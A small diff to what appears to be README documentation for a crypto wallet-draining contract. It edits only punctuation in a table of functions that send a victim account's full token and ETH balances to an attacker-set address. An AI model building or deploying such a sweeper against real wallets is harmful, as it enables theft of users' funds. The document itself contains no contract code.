@@ -23,7 +23,7 @@ constructor(address attacker)
 | `sweepToken(address token)` | Transfers the account's full ERC-20 balance of `token` to `ATTACKER`. |
 | `sweepTokens(address[] tokens)` | Same, for several tokens. |
 | `sweepNative()` | Sends the account's full ETH balance to `ATTACKER`. |
-| `sweepAll(address[] tokens)` | Tokens then native, in one call — the full "empty the wallet". |
+| `sweepAll(address[] tokens)` | Tokens then native, in one call, the full "empty the wallet". |
 
 Events: `Swept(victim, token, amount)`, `SweptNative(victim, amount)`.
 
